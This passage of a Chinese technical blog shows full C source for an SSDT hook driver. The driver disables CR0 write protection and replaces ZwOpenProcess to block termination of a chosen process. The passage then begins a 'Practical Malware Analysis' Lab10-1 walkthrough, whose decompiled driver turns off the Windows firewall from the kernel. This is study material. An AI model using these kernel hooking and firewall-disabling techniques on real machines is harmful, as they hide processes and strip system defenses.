&#123;</span><br><span class=\"line\">        //设为拒绝访问</span><br><span class=\"line\">        DesiredAccess = 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //调用原函数</span><br><span class=\"line\">    return g_OldZwOpenProcess(</span><br><span class=\"line\">        ProcessHandle,</span><br><span class=\"line\">        DesiredAccess,</span><br><span class=\"line\">        ObjectAttributes,</span><br><span class=\"line\">        ClientId);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>完整源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ntifs.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//内核之SSDT-HOOK</span></span><br><span class=\"line\"><span class=\"comment\">//系统服务表</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    PULONG ServiceTableBase;       <span class=\"comment\">//函数地址表的首地址</span></span><br><span class=\"line\">    PULONG ServiceCounterTableBase;<span class=\"comment\">//函数表中每个函数被调用的次数</span></span><br><span class=\"line\">    ULONG  NumberOfService;        <span class=\"comment\">//服务函数的个数</span></span><br><span class=\"line\">    ULONG ParamTableBase;          <span class=\"comment\">//参数个数表首地址</span></span><br><span class=\"line\">&#125;KSYSTEM_SERVICE_TABLE;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//服务描述符</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    KSYSTEM_SERVICE_TABLE ntoskrnl;<span class=\"comment\">//ntoskrnl.exe的服务函数,SSDT</span></span><br><span class=\"line\">    KSYSTEM_SERVICE_TABLE win32k;  <span class=\"comment\">//win32k.sys的服务函数,ShadowSSDT</span></span><br><span class=\"line\">    KSYSTEM_SERVICE_TABLE notUsed1;<span class=\"comment\">//暂时没用1</span></span><br><span class=\"line\">    KSYSTEM_SERVICE_TABLE notUsed2;<span class=\"comment\">//暂时没用2</span></span><br><span class=\"line\">&#125;KSERVICE_TABLE_DESCRIPTOR;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//定义HOOK的函数的类型</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"title function_\">NTSTATUS</span> <span class=\"params\">(NTAPI*FuZwOpenProcess)</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    _Out_ PHANDLE ProcessHandle,</span></span><br><span class=\"line\"><span class=\"params\">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class=\"line\"><span class=\"params\">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class=\"line\"><span class=\"params\">    _In_opt_ PCLIENT_ID ClientId</span></span><br><span class=\"line\"><span class=\"params\">)</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//自写的函数声明</span></span><br><span class=\"line\">NTSTATUS NTAPI <span class=\"title function_\">MyZwOpenProcess</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    _Out_ PHANDLE ProcessHandle,</span></span><br><span class=\"line\"><span class=\"params\">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class=\"line\"><span class=\"params\">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class=\"line\"><span class=\"params\">    _In_opt_ PCLIENT_ID ClientId</span></span><br><span class=\"line\"><span class=\"params\">)</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//记录系统的该函数</span></span><br><span class=\"line\">FuZwOpenProcess g_OldZwOpenProcess;</span><br><span class=\"line\"><span class=\"comment\">//服务描述符表指针</span></span><br><span class=\"line\">KSERVICE_TABLE_DESCRIPTOR* g_pServiceTable = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"comment\">//要保护进程的ID</span></span><br><span class=\"line\">ULONG g_Pid = <span class=\"number\">9527</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//安装钩子</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">InstallHook</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"comment\">//卸载钩子</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">UninstallHook</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"comment\">//关闭页写入保护</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">ShutPageProtect</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"comment\">//开启页写入保护</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">OpenPageProtect</span><span class=\"params\">()</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//卸载驱动</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">OutLoad</span><span class=\"params\">(DRIVER_OBJECT* obj)</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">////***驱动入口主函数***/</span></span><br><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(DRIVER_OBJECT* driver, UNICODE_STRING* path)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    path;</span><br><span class=\"line\">    KdPrint((<span class=\"string\">&quot;驱动启动成功！\\n&quot;</span>));</span><br><span class=\"line\">    <span class=\"comment\">//DbgBreakPoint();</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//安装钩子</span></span><br><span class=\"line\">    InstallHook();</span><br><span class=\"line\"> </span><br><span class=\"line\">    driver-&gt;DriverUnload = OutLoad;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//卸载驱动</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">OutLoad</span><span class=\"params\">(DRIVER_OBJECT* obj)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    obj;</span><br><span class=\"line\">    <span class=\"comment\">//卸载钩子</span></span><br><span class=\"line\">    UninstallHook();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//安装钩子</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">InstallHook</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//1.获取KTHREAD</span></span><br><span class=\"line\">    PETHREAD pNowThread = PsGetCurrentThread();</span><br><span class=\"line\">    <span class=\"comment\">//2.获取ServiceTable表</span></span><br><span class=\"line\">    g_pServiceTable = (KSERVICE_TABLE_DESCRIPTOR*)</span><br><span class=\"line\">        (*(ULONG*)((ULONG)pNowThread + <span class=\"number\">0xbc</span>));</span><br><span class=\"line\">    <span class=\"comment\">//3.保存旧的函数</span></span><br><span class=\"line\">    g_OldZwOpenProcess = (FuZwOpenProcess)</span><br><span class=\"line\">        g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[<span class=\"number\">0xbe</span>];</span><br><span class=\"line\">    <span class=\"comment\">//4.关闭页只读保护</span></span><br><span class=\"line\">    ShutPageProtect();</span><br><span class=\"line\">    <span class=\"comment\">//5.写入自己的函数到SSDT表内</span></span><br><span class=\"line\">    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[<span class=\"number\">0xbe</span>]</span><br><span class=\"line\">        = (ULONG)MyZwOpenProcess;</span><br><span class=\"line\">    <span class=\"comment\">//6.开启页只读保护</span></span><br><span class=\"line\">    OpenPageProtect();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//卸载钩子</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">UninstallHook</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//1.关闭页只读保护</span></span><br><span class=\"line\">    ShutPageProtect();</span><br><span class=\"line\">    <span class=\"comment\">//2.写入原来的函数到SSDT表内</span></span><br><span class=\"line\">    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[<span class=\"number\">0xbe</span>]</span><br><span class=\"line\">        = (ULONG)g_OldZwOpenProcess;</span><br><span class=\"line\">    <span class=\"comment\">//3.开启页只读保护</span></span><br><span class=\"line\">    OpenPageProtect();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//关闭页只读保护</span></span><br><span class=\"line\"><span class=\"type\">void</span> _declspec(naked) ShutPageProtect()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        push eax;</span><br><span class=\"line\">        mov eax, cr0;</span><br><span class=\"line\">        and eax, ~<span class=\"number\">0x10000</span>;</span><br><span class=\"line\">        mov cr0, eax;</span><br><span class=\"line\">        pop eax;</span><br><span class=\"line\">        ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//开启页只读保护</span></span><br><span class=\"line\"><span class=\"type\">void</span> _declspec(naked) OpenPageProtect()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        push eax;</span><br><span class=\"line\">        mov eax, cr0;</span><br><span class=\"line\">        or eax, <span class=\"number\">0x10000</span>;</span><br><span class=\"line\">        mov cr0, eax;</span><br><span class=\"line\">        pop eax;</span><br><span class=\"line\">        ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//自写的函数</span></span><br><span class=\"line\">NTSTATUS NTAPI <span class=\"title function_\">MyZwOpenProcess</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    _Out_ PHANDLE ProcessHandle,</span></span><br><span class=\"line\"><span class=\"params\">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class=\"line\"><span class=\"params\">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class=\"line\"><span class=\"params\">    _In_opt_ PCLIENT_ID ClientId</span></span><br><span class=\"line\"><span class=\"params\">)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//当此进程为要保护的进程时</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ClientId-&gt;UniqueProcess == (HANDLE)g_Pid &amp;&amp;</span><br><span class=\"line\">        DesiredAccess == PROCESS_TERMINATE)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">//设为拒绝访问</span></span><br><span class=\"line\">        DesiredAccess = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//调用原函数</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> g_OldZwOpenProcess(</span><br><span class=\"line\">        ProcessHandle,</span><br><span class=\"line\">        DesiredAccess,</span><br><span class=\"line\">        ObjectAttributes,</span><br><span class=\"line\">        ClientId);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"《恶意代码分析实战》——Lab10-1\"><a href=\"#《恶意代码分析实战》——Lab10-1\" class=\"headerlink\" title=\"《恶意代码分析实战》——Lab10.1\"></a>《恶意代码分析实战》——Lab10.1</h1><h2 id=\"静态分析-Lab10-01-exe\"><a href=\"#静态分析-Lab10-01-exe\" class=\"headerlink\" title=\"静态分析-Lab10-01.exe\"></a>静态分析-Lab10-01.exe</h2><p>用IDA查看该程序主函数，发现其主要是调用OpenSCManagerA获取服务管理器句柄，然后调用CreateServiceA，创建一个名为Lab10-01的服务。CreateServiceA调用告诉我们服务使用了”C:\\Windows\\System32\\Lab10-01.sys”中的代码，服务类型为3（SERVICE_KERNEL_DRIVER），这意味着这个文件将被加载到内核。</p>\n<p>如果CreateServiceA调用失败，代码会使用相同的服务名”Lab10-01”调用OpenServiceA，即表示如果因为服务已经存在而导致调用CreateServiceA失败，则打开”Lab10-01”服务的句柄。</p>\n<p>接下来调用StartServiceA来启动服务。</p>\n<p>最后调用ControlService。ControlService的第二个参数是发送控制消息的类型。本例中它的值是SERVICE_CONTROL_STOP（1），这将会卸载驱动，并调用驱动的卸载函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __stdcall <span class=\"title function_\">WinMain</span><span class=\"params\">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class=\"type\">int</span> nShowCmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax@1</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v5; <span class=\"comment\">// edi@1</span></span><br><span class=\"line\">  SC_HANDLE v6; <span class=\"comment\">// esi@2</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">SERVICE_STATUS</span> <span class=\"title\">ServiceStatus</span>;</span> <span class=\"comment\">// [sp+4h] [bp-1Ch]@5</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = (<span class=\"type\">int</span>)OpenSCManagerA(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0xF003Fu</span>);</span><br><span class=\"line\">  v5 = (<span class=\"type\">void</span> *)result;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( result )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v6 = CreateServiceA(</span><br><span class=\"line\">           (SC_HANDLE)result,</span><br><span class=\"line\">           <span class=\"string\">&quot;Lab10-01&quot;</span>,</span><br><span class=\"line\">           <span class=\"string\">&quot;Lab10-01&quot;</span>,</span><br><span class=\"line\">           <span class=\"number\">0xF01FFu</span>,</span><br><span class=\"line\">           <span class=\"number\">1u</span>,</span><br><span class=\"line\">           <span class=\"number\">3u</span>,</span><br><span class=\"line\">           <span class=\"number\">1u</span>,</span><br><span class=\"line\">           <span class=\"string\">&quot;C:\\\\Windows\\\\System32\\\\Lab10-01.sys&quot;</span>,</span><br><span class=\"line\">           <span class=\"number\">0</span>,</span><br><span class=\"line\">           <span class=\"number\">0</span>,</span><br><span class=\"line\">           <span class=\"number\">0</span>,</span><br><span class=\"line\">           <span class=\"number\">0</span>,</span><br><span class=\"line\">           <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 || (v6 = OpenServiceA(v5, <span class=\"string\">&quot;Lab10-01&quot;</span>, <span class=\"number\">0xF01FFu</span>)) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      StartServiceA(v6, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v6 )</span><br><span class=\"line\">        ControlService(v6, SERVICE_CONTROL_STOP, &amp;ServiceStatus);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"静态分析-Lab10-01-sys\"><a href=\"#静态分析-Lab10-01-sys\" class=\"headerlink\" title=\"静态分析-Lab10-01.sys\"></a>静态分析-Lab10-01.sys</h2><p>使用IDA分析驱动，可以看到sub_10906函数中将sub_10486函数地址赋值给了DriverObject-&gt;DriverUnload。</p>\n<p>而sub_10486函数中，则调用三次 RtlCreateRegistryKey函数创建了一些注册表键，然后调用两次RtlWriteRegistryValue函数，在两个地方设置EnableFirewall值为0。从内核禁用防火墙的这种方法难以被安全程序探测到。</p>\n<p>其中，当从内核态访问注册表时，前缀\\Registry\\Machine等同于用户态程序访问的HKEY_LOCAL_MACHINE。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NTSTATUS __stdcall <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  sub_10920();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sub_10906(DriverObject, RegistryPath);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS __stdcall <span class=\"title function_\">sub_10906</span><span class=\"params\">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)sub_10486;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS __stdcall <span class=\"title function_\">sub_10486</span><span class=\"params\">(<span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> ValueData; <span class=\"comment\">// [sp+Ch] [bp-4h]@1</span></span><br><span class=\"line\"></span><br><span class=\"line\">  ValueData = <span class=\"number\">0</span>;</span><br><span class=\"line\">  RtlCreateRegistryKey(<span class=\"number\">0</span>, <span class=\"string\">L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft&quot;</span>);</span><br><span class=\"line\">  RtlCreateRegistryKey(<span class=\"number\">0</span>, <span class=\"string\">L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall&quot;</span>);</span><br><span class=\"line\">  RtlCreateRegistryKey(<span class=\"number\">0</span>, <span class=\"string\">L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile&quot;</span>);</span><br><span class=\"line\">  RtlCreateRegistryKey(<span class=\"number\">0</span>, <span class=\"string\">L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile&quot;</span>);</span><br><span class=\"line\">  RtlWriteRegistryValue(</span><br><span class=\"line\">    <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile&quot;</span>,</span><br><span class=\"line\">    &amp;ValueName,</span><br><span class=\"line\">    <span class=\"number\">4u</span>,</span><br><span class=\"line\">    &amp;ValueData,</span><br><span class=\"line\">    <span class=\"number\">4u</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> RtlWriteRegistryValue(</span><br><span class=\"line\">           <span class=\"number\">0</span>,</span><br><span class=\"line\">           <span class=\"string\">L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile&quot;</span>,</span><br><span class=\"line\">           &amp;ValueName,</span><br><span class=\"line\">           <span class=\"number\">4u</span>,</span><br><span class=\"line\">           &amp;ValueData,</span><br><span class=\"line\">           <span class=\"number\">4u</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"使用windbg分析Lab10-01-sys\"><a href=\"#使用windbg分析Lab10-01-sys\" class=\"headerlink\" title=\"使用windbg分析Lab10-01.sys\"></a>使用windbg分析Lab10-01.sys</h2><p>首先将Lab10-01.sys复制到C:\\Windows\\System32\\Lab10-01.sys路径然后再进行实验</p>\n<p>我们可以使用Windbg检查Lab10-01.sys，来查看当前调用ControlService卸载驱动时会发生什么事情。用户空间可执行程序（Lab10-01.exe）的代码加载Lab10-01.sys，然后立即卸载它。如果我们在运行恶意可执行程序之前使用内核调试器，因为此时驱动还未在内核中，所以不能检查它。但是，等应用程序运行完成，那时驱动又已经从内存中卸载了。</p>\n<p>为了在Lab10-01.sys载入内存后，使用Windbg分析它，在虚拟机中，将可执行程序（Lab10-01.exe）载入x32dbg中，然后在驱动加载和卸载之间设置断点（在call ControlService时）并运行，一旦程序在断点处暂停，就回到内核调试器（Break）。</p>\n<p>![在call ControlService处设置断点](.&#x2F;《恶意代码分析实战》——Lab10.1&#x2F;在call ControlService处设置断点.png)</p>\n<p>我们知道要分析的服务叫”Lab10-01”，可以通过使用命令<code>!drvobj</code>来获取驱动对象：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; !drvobj Lab10-01</span><br><span class=\"line\">Driver object (871df558) is for:</span><br><span class=\"line\"> \\Driver\\Lab10-01</span><br><span class=\"line\"></span><br><span class=\"line\">Driver Extension List: (id , addr)</span><br><span class=\"line\"></span><br><span class=\"line\">Device Object list:</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 